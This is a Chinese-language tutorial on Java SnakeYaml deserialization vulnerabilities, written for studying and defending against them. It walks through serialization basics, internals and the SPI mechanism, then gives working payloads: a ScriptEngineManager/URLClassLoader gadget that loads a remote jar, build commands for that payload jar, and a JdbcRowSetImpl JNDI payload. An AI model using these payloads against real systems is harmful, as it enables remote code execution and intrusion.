### Snakeyaml简介

YAML是”YAML Ain’t a Markup Language”；它并不是一种标记语言，而是用来表示序列化的一种格式；类似于XML但比XML更简洁。

在java中自然有对应的库对其进行解析，SnakeYaml；支持对象的序列化和反序列化；常见的利用javax.script.ScriptEngineManager的利用链是基于SPI机制进行实现的；

推一个yaml格式化工具：https://www.345tool.com/zh-hans/formatter/yaml-formatter

### SnakeYaml序列化与反序列化基础

#### 依赖

```xml
<dependency>
  <groupId>org.yaml</groupId>
  <artifactId>snakeyaml</artifactId>
  <version>1.27</version>
</dependency>
```

SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。

- Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；
- Yaml.dump()：将一个对象转化为yaml文件形式；

```java
public class snake {
//        static {
//        try {
//            Runtime.getRuntime().exec("calc");
//        }catch (Exception e){
//
//        }
//    }
    protected String name;
    private String test;
    public String tt;
    String abc;
    public snake(){
        System.out.println("构造方法");
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public void setTest(String test) {
        System.out.println("setTest");
        this.test = test;
    }

    public void setTt(String tt) {
        System.out.println("setTt");

        this.tt = tt;
    }

    public void setAbc(String abc) {
        System.out.println("setAbc");

        this.abc = abc;
    }
}
```

#### 序列化

```java
public static void serialize(){
        snake snake = new snake();
        snake.setName("abc");
        snake.setTest("aa");
        snake.setTt("jj");
        snake.setAbc("def");
        Yaml yaml = new Yaml();
        String str = yaml.dump(snake);
        System.out.println(str);
    }
```

![image-20220906132123868](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906132123868.png)

可以发现YAML使用`!!xxx`标明类名

#### 反序列化

```java
public static void unserialize(){
        Yaml yaml = new Yaml();
        yaml.load("!!test.snake {name: abc, test: aa, tt: jj, abc: def}");
    }
```

![image-20220906132209982](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906132209982.png)

当属性不是由public修饰的时候会调用set方法

可以看到`Constructor#constructJavaBean2ndStep`，其中会获取yaml格式数据中的属性的键值对，然后调用property.set()来设置新建的目标对象的属性值

![image-20220906133643140](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906133643140.png)

这个property是在`org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap`设置的

![image-20220906134557288](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906134557288.png)

如果是public修饰则调用`org.yaml.snakeyaml.introspector.FieldProperty#set`，通过反射获取值。而如果是MethodProperty.set()函数，则就是通过反射机制来调用目标类name属性的setter方法来进行属性值的设置。



#### 反序列化流程

```
set:77, MethodProperty (org.yaml.snakeyaml.introspector)
constructJavaBean2ndStep:285, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
construct:171, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)
constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)
constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)
constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)
getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)
loadFromReader:490, Yaml (org.yaml.snakeyaml)
load:416, Yaml (org.yaml.snakeyaml)
unserialize:21, testsnake (test)
main:7, testsnake (test)
```

这里先讲一个细节：

从constructDocument会走到getClassForNode()函数，这里先根据tag取出className为目标类，然后调用getClassForName()函数获取到具体的类。

![image-20220906142252673](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906142252673.png)



而getClassForName可以初始化静态块里面的函数，所以这里可以弹一下计算器

### 漏洞复现

#### SPI机制

SPI（Service Provider Interface），是JDK内置的一种 服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 **解耦**。

SPI整体机制图如下：

![img](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/java-advanced-spi-8.jpg)

当服务的提供者提供了一种接口的实现之后，需要在classpath下的`META-INF/services/`目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的`META-INF/services/`中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：`java.util.ServiceLoader`。

#### 利用SPI机制-基于ScriptEngineManager利用链

```java
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/a.jar"]]]]
```

POC脚本：https://github.com/artsploit/yaml-payload

![image-20220906145030274](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906145030274.png)

打包一下：

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

利用：

```java
import org.yaml.snakeyaml.Yaml;

public class yaml {
    public static void main(String[] args) {
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(context);
    }
}
```

![image-20220906145748078](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220906145748078.png)



#### JdbcRowSetImpl打jndi

```
String poc = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"rmi://127.0.0.1:1099/Exploit\", autoCommit: true}";
```

#### 不出网

> https://xz.aliyun.com/t/10655





参考：

https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#%E4%BD%BF%E7%94%A8SnakeYaml%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96

https://s1mple-top.github.io/2022/03/26/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/

https://www.cnblogs.com/R0ser1/p/16213257.html#snake-yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B

https://xz.aliyun.com/t/11599#toc-1

https://xz.aliyun.com/t/10655

